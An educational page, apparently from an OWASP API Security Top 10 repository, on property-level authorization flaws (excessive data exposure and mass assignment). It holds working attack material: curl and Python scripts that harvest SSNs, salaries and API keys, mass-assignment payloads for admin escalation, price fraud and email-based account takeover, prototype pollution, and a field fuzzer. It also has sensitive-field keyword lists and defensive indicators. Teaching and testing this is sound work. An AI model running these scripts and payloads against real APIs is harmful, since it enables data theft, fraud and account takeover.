# API03: Broken Object Property Level Authorization - Attack Vectors

## Table of Contents
- [Understanding the Attack Surface](#understanding-the-attack-surface)
- [Excessive Data Exposure Attacks](#excessive-data-exposure-attacks)
- [Mass Assignment Attacks](#mass-assignment-attacks)
- [Advanced Attack Scenarios](#advanced-attack-scenarios)
- [Attack Tools and Automation](#attack-tools-and-automation)
- [Detection and Reconnaissance](#detection-and-reconnaissance)

## Understanding the Attack Surface

Property-level authorization vulnerabilities exist whenever an API:
- Serializes database models directly without filtering
- Accepts client input without property allowlisting
- Uses the same schema for different user roles
- Relies on client-side filtering for security
- Lacks field-level access control

### Two Primary Attack Categories

```
┌─────────────────────────────────────────────────┐
│  EXCESSIVE DATA EXPOSURE                        │
│  ─────────────────────────                      │
│  Attacker receives more data than authorized    │
│  Target: GET, LIST endpoints                    │
│  Impact: Information disclosure                 │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│  MASS ASSIGNMENT                                │
│  ───────────────                                │
│  Attacker modifies restricted properties        │
│  Target: POST, PUT, PATCH endpoints             │
│  Impact: Privilege escalation, data corruption  │
└─────────────────────────────────────────────────┘
```

## Excessive Data Exposure Attacks

### Attack Vector 1: Sensitive Field Harvesting

**Objective**: Extract sensitive data exposed in API responses

#### Attack Steps

```bash
# Step 1: Request user profile
curl -H "Authorization: Bearer $TOKEN" \
  https://api.example.com/v1/users/me

# Vulnerable Response:
{
  "id": 123,
  "name": "John Doe",
  "email": "john@example.com",
  "phone": "+1-555-0100",
  "ssn": "123-45-6789",              ← SENSITIVE
  "salary": 85000,                    ← SENSITIVE
  "password_hash": "$2b$12$...",      ← SENSITIVE
  "api_key": "sk_live_abc123",        ← SENSITIVE
  "is_admin": false,                  ← SENSITIVE
  "created_at": "2023-01-15",
  "last_login_ip": "192.168.1.100"    ← SENSITIVE
}

# Step 2: Automate data harvesting
for id in {1..10000}; do
  curl -s -H "Authorization: Bearer $TOKEN" \
    https://api.example.com/v1/users/$id | \
    jq '{ssn, salary, api_key}' >> harvested_data.json
done
```

**Impact**:
- ❌ Mass privacy violation
- ❌ Identity theft potential
- ❌ Credential theft (API keys, tokens)
- ❌ Compliance violations (GDPR, PCI-DSS, HIPAA)

### Attack Vector 2: GraphQL Over-Fetching

**Objective**: Use GraphQL introspection to discover and fetch all fields

#### Attack Steps

```graphql
# Step 1: Introspection query to discover fields
{
  __type(name: "User") {
    fields {
      name
      type {
        name
      }
    }
  }
}

# Response reveals ALL fields:
{
  "data": {
    "__type": {
      "fields": [
        {"name": "id", "type": {"name": "Int"}},
        {"name": "name", "type": {"name": "String"}},
        {"name": "passwordHash", "type": {"name": "String"}},  ← Discoverable!
        {"name": "apiKey", "type": {"name": "String"}},        ← Discoverable!
        {"name": "salary", "type": {"name": "Int"}},           ← Discoverable!
        {"name": "isAdmin", "type": {"name": "Boolean"}}       ← Discoverable!
      ]
    }
  }
}

# Step 2: Query all sensitive fields
{
  users(first: 100) {
    edges {
      node {
        id
        name
        passwordHash
        apiKey
        salary
        isAdmin
      }
    }
  }
}
```

**Impact**:
- ❌ Complete schema disclosure
- ❌ Access to password hashes
- ❌ Credential exposure
- ❌ Business intelligence leakage

### Attack Vector 3: Response Interception

**Objective**: Capture over-exposed data in transit

#### Attack Scenario

```javascript
// Frontend code attempts to filter sensitive data
fetch('/api/users/me')
  .then(res => res.json())
  .then(data => {
    // Client-side filtering
    const {passwordHash, apiKey, ssn, ...publicData} = data;
    renderProfile(publicData);
  });

// Attacker intercepts with browser DevTools or proxy:
// Network tab shows FULL response including:
// - passwordHash
// - apiKey
// - ssn
// - salary
```

**Attack Tools**:
- Browser Developer Tools (Network tab)
- Burp Suite
- OWASP ZAP
- mitmproxy
- Fiddler

**Impact**:
- ❌ Client-side filtering is useless
- ❌ All transmitted data is accessible
- ❌ Mobile app responses can be intercepted
- ❌ Man-in-the-middle attacks expose everything

### Attack Vector 4: Pagination-Based Data Scraping

**Objective**: Enumerate all records to harvest sensitive fields

#### Attack Steps

```python
import requests
import json

base_url = "https://api.example.com/v1/users"
headers = {"Authorization": f"Bearer {token}"}
all_data = []

# Iterate through pages
page = 1
while True:
    response = requests.get(
        f"{base_url}?page={page}&per_page=100",
        headers=headers
    )
    users = response.json()
    
    if not users:
        break
    
    # Extract sensitive fields from each user
    for user in users:
        all_data.append({
            'id': user['id'],
            'email': user['email'],
            'ssn': user['ssn'],              # Exposed!
            'salary': user['salary'],        # Exposed!
            'api_key': user['api_key']       # Exposed!
        })
    
    page += 1

# Save harvested data
with open('stolen_data.json', 'w') as f:
    json.dump(all_data, f)

print(f"Harvested {len(all_data)} user records")
```

**Impact**:
- ❌ Systematic data exfiltration
- ❌ Massive privacy breach
- ❌ Competitive intelligence theft
- ❌ Enables targeted attacks

## Mass Assignment Attacks

### Attack Vector 5: Privilege Escalation

**Objective**: Elevate user privileges by setting admin flags

#### Attack Steps

```bash
# Step 1: Normal profile update
curl -X PUT https://api.example.com/v1/users/123 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Updated Name",
    "email": "new@example.com"
  }'

# Step 2: Attempt to add is_admin field
curl -X PUT https://api.example.com/v1/users/123 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Hacker",
    "email": "hacker@example.com",
    "is_admin": true,          ← Mass assignment attack
    "role": "superadmin"       ← Role escalation
  }'

# Vulnerable server accepts and updates:
UPDATE users 
SET name = 'Hacker',
    email = 'hacker@example.com',
    is_admin = true,           ← Privilege escalated!
    role = 'superadmin'        ← Admin access gained!
WHERE id = 123;

# Step 3: Verify escalation
curl -H "Authorization: Bearer $TOKEN" \
  https://api.example.com/v1/admin/users

# Success! Now accessing admin endpoint
```

**Impact**:
- ❌ Complete system compromise
- ❌ Access to all user data
- ❌ Ability to modify other accounts
- ❌ Data deletion or corruption

### Attack Vector 6: Financial Fraud via Price Manipulation

**Objective**: Modify prices, balances, or transaction amounts

#### Attack Steps

```bash
# Scenario: E-commerce checkout API

# Step 1: Add items to cart
curl -X POST https://api.example.com/v1/cart/items \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "product_id": 456,
    "quantity": 1
  }'

# Step 2: Create order (attempt price manipulation)
curl -X POST https://api.example.com/v1/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "cart_id": 789,
    "shipping_address": "123 Main St",
    "price": 0.01,              ← Mass assignment attack
    "discount_percent": 99,     ← Manipulate discount
    "status": "paid",           ← Skip payment
    "is_verified": true         ← Bypass verification
  }'

# Vulnerable API accepts price modification
# Order created for $0.01 instead of $999.99
```

**Impact**:
- ❌ Direct financial loss
- ❌ Inventory given away for free
- ❌ Revenue manipulation
- ❌ Accounting fraud

### Attack Vector 7: Workflow Bypass via Status Manipulation

**Objective**: Skip approval steps by directly setting status fields

#### Attack Steps

```bash
# Scenario: Document approval workflow

# Normal flow: draft → pending → approved
# Attacker bypasses by setting status directly

curl -X POST https://api.example.com/v1/documents \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "title": "Malicious Document",
    "content": "...",
    "status": "approved",           ← Skip pending review
    "approved_by": 1,               ← Forge approver
    "approved_at": "2024-01-17"     ← Forge timestamp
  }'

# Document appears approved without going through review
```

**Impact**:
- ❌ Business logic bypass
- ❌ Unauthorized actions appear legitimate
- ❌ Audit trail corruption
- ❌ Compliance violations

### Attack Vector 8: Account Takeover via Email Modification

**Objective**: Change email without verification to take over accounts

#### Attack Steps

```bash
# Step 1: Update victim's email to attacker's email
curl -X PUT https://api.example.com/v1/users/456 \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -d '{
    "email": "attacker@evil.com",
    "email_verified": true        ← Mass assignment bypass
  }'

# Vulnerable API allows:
# 1. Email change without verification
# 2. Setting email_verified flag
# 3. Potential access to reset password flow

# Step 2: Trigger password reset to new email
curl -X POST https://api.example.com/v1/auth/password-reset \
  -d '{"email": "attacker@evil.com"}'

# Step 3: Attacker receives reset link for victim's account
```

**Impact**:
- ❌ Complete account takeover
- ❌ Access to victim's data
- ❌ Identity theft
- ❌ Financial fraud

### Attack Vector 9: Batch Mass Assignment

**Objective**: Exploit batch update endpoints to modify multiple restricted properties

#### Attack Steps

```bash
# Batch user update endpoint
curl -X PUT https://api.example.com/v1/users/batch \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "users": [
      {
        "id": 100,
        "is_admin": true,
        "balance": 1000000
      },
      {
        "id": 101,
        "is_admin": true,
        "balance": 1000000
      },
      {
        "id": 102,
        "is_admin": true,
        "balance": 1000000
      }
    ]
  }'

# Vulnerable batch endpoint updates all fields
# Multiple accounts compromised in single request
```

**Impact**:
- ❌ Mass privilege escalation
- ❌ Systemic financial fraud
- ❌ Widespread data corruption
- ❌ Difficult to detect and remediate

## Advanced Attack Scenarios

### Attack Vector 10: Parameter Pollution

**Objective**: Exploit parameter handling to inject additional fields

#### Attack Techniques

```bash
# Technique 1: Array injection
curl -X PUT https://api.example.com/v1/users/123 \
  -d 'name=John&name=Jane&is_admin=true'
# Some frameworks take last value, some first, some create array

# Technique 2: Nested object injection
curl -X PUT https://api.example.com/v1/users/123 \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John",
    "profile": {
      "bio": "Developer",
      "is_admin": true          ← Nested mass assignment
    }
  }'

# Technique 3: JSON prototype pollution
curl -X PUT https://api.example.com/v1/users/123 \
  -d '{
    "name": "John",
    "__proto__": {
      "isAdmin": true           ← Prototype pollution
    }
  }'
```

### Attack Vector 11: Type Confusion

**Objective**: Exploit weak typing to inject unexpected values

#### Attack Examples

```bash
# Sending boolean as string
curl -X PUT https://api.example.com/v1/users/123 \
  -d '{"is_admin": "true"}'      # String "true" might evaluate to true

# Sending number as string
curl -X PUT https://api.example.com/v1/products/456 \
  -d '{"price": "0"}'            # String "0" might convert to 0

# Sending array instead of scalar
curl -X PUT https://api.example.com/v1/users/123 \
  -d '{"role": ["user", "admin"]}'  # Might take first or last

# SQL injection via mass assignment
curl -X PUT https://api.example.com/v1/users/123 \
  -d '{"name": "John", "query": "SELECT * FROM users"}'
```

### Attack Vector 12: Hidden Field Discovery

**Objective**: Discover undocumented fields through various methods

#### Discovery Techniques

```bash
# Method 1: Error messages
curl -X PUT https://api.example.com/v1/users/123 \
  -d '{"invalid_field": "test"}'

# Error might reveal valid fields:
# "Invalid fields: invalid_field. Valid fields: id, name, email, is_admin, salary"

# Method 2: API documentation endpoint
curl https://api.example.com/v1/swagger.json
curl https://api.example.com/v1/openapi.json
curl https://api.example.com/v1/docs

# Method 3: OPTIONS request
curl -X OPTIONS https://api.example.com/v1/users/123

# Method 4: Fuzzing common field names
for field in is_admin role permission balance salary price; do
  curl -X PUT https://api.example.com/v1/users/123 \
    -d "{\"$field\": true}" -w "%{http_code}\n"
done
```

## Attack Tools and Automation

### Automated Mass Assignment Testing

```python
# mass_assignment_fuzzer.py
import requests
import json

# Common privilege escalation fields
COMMON_FIELDS = [
    'is_admin', 'isAdmin', 'admin', 'role', 'roles',
    'is_superuser', 'superuser', 'permissions', 'permission',
    'is_staff', 'staff', 'is_moderator', 'moderator',
    'account_type', 'user_type', 'privilege_level',
    'is_verified', 'verified', 'is_approved', 'approved'
]

# Common financial fields
FINANCIAL_FIELDS = [
    'balance', 'credit', 'amount', 'price', 'cost',
    'discount', 'discount_percent', 'total', 'subtotal',
    'salary', 'wage', 'payment_amount'
]

def test_mass_assignment(url, token, user_id):
    headers = {'Authorization': f'Bearer {token}'}
    
    # Test privilege fields
    for field in COMMON_FIELDS:
        payload = {
            'name': 'Test User',
            field: True
        }
        
        response = requests.put(
            f'{url}/users/{user_id}',
            headers=headers,
            json=payload
        )
        
        if response.status_code == 200:
            print(f'[!] Potential mass assignment: {field}')
            print(f'    Response: {response.json()}')
    
    # Test financial fields
    for field in FINANCIAL_FIELDS:
        payload = {
            'name': 'Test User',
            field: 999999
        }
        
        response = requests.put(
            f'{url}/users/{user_id}',
            headers=headers,
            json=payload
        )
        
        if response.status_code == 200:
            print(f'[!] Potential financial manipulation: {field}')
            print(f'    Response: {response.json()}')

# Usage
test_mass_assignment('https://api.example.com/v1', 'your_token', 123)
```

### Excessive Data Exposure Scanner

```python
# data_exposure_scanner.py
import requests
import json

SENSITIVE_KEYWORDS = [
    'password', 'passwd', 'pwd', 'pass',
    'secret', 'api_key', 'apikey', 'token',
    'ssn', 'social_security', 'credit_card', 'cvv',
    'private_key', 'hash', 'salt',
    'salary', 'wage', 'compensation',
    'is_admin', 'role', 'permission'
]

def scan_endpoint(url, token):
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        exposed_fields = []
        
        def check_fields(obj, path=''):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    full_path = f'{path}.{key}' if path else key
                    
                    # Check if field name contains sensitive keywords
                    for keyword in SENSITIVE_KEYWORDS:
                        if keyword in key.lower():
                            exposed_fields.append({
                                'field': full_path,
                                'value': value,
                                'keyword': keyword
                            })
                    
                    # Recurse into nested objects
                    if isinstance(value, (dict, list)):
                        check_fields(value, full_path)
            
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    check_fields(item, f'{path}[{i}]')
        
        check_fields(data)
        
        if exposed_fields:
            print(f'[!] Excessive data exposure found in {url}')
            for field in exposed_fields:
                print(f'    - {field["field"]}: {field["keyword"]}')
        
        return exposed_fields
    
    return []

# Usage
scan_endpoint('https://api.example.com/v1/users/me', 'your_token')
```

## Detection and Reconnaissance

### Reconnaissance Checklist

```
□ Enumerate API endpoints (docs, swagger, openapi)
□ Inspect GET responses for sensitive fields
□ Test OPTIONS/HEAD for field disclosure
□ Analyze error messages for field names
□ Review client-side code for field usage
□ Test GraphQL introspection
□ Attempt common mass assignment fields
□ Fuzz parameter names
□ Test with different user roles
□ Monitor response sizes for anomalies
□ Check for prototype pollution vectors
□ Test batch/bulk endpoints
□ Analyze websocket messages
□ Review mobile app traffic
□ Test file upload metadata
```

### OWASP ZAP Configuration

```xml
<!-- Add custom mass assignment fuzzer -->
<rule>
  <name>Mass Assignment Test</name>
  <attack>
    <param>is_admin</param>
    <value>true</value>
  </attack>
  <attack>
    <param>role</param>
    <value>admin</value>
  </attack>
  <attack>
    <param>balance</param>
    <value>999999</value>
  </attack>
</rule>
```

## Real-World Attack Timeline

```
Hour 0: Attacker discovers API endpoint
Hour 1: Reconnaissance - map endpoints and fields
Hour 2: Test for excessive data exposure
Hour 3: Discover exposed sensitive fields
Hour 4: Automate data harvesting script
Hour 5: Test mass assignment vectors
Hour 6: Achieve privilege escalation
Hour 7: Access admin endpoints
Hour 8: Exfiltrate entire database
Hour 9: Cover tracks, sell data

Total time to breach: Less than 10 hours
```

## Defensive Indicators

Signs you may be under attack:
- ✓ Unusual parameter names in requests
- ✓ Requests with many unexpected fields
- ✓ Repeated access to user enumeration endpoints
- ✓ Large volume of GET requests to profile endpoints
- ✓ Sudden privilege escalations in audit logs
- ✓ Unexpected modifications to admin flags
- ✓ Anomalous changes to financial fields
- ✓ Batch operations with suspicious patterns

## What's Next?

- **[Prevention](./prevention.md)**: Learn how to protect against property-level authorization attacks
- **[Examples](./examples.md)**: See secure vs vulnerable code implementations
- **[Lab](./lab/api03-mass-assignment-lab/)**: Practice exploiting and fixing these vulnerabilities

---

*Part of the [OWASP API Security Top 10 Educational Repository](../../README.md)*
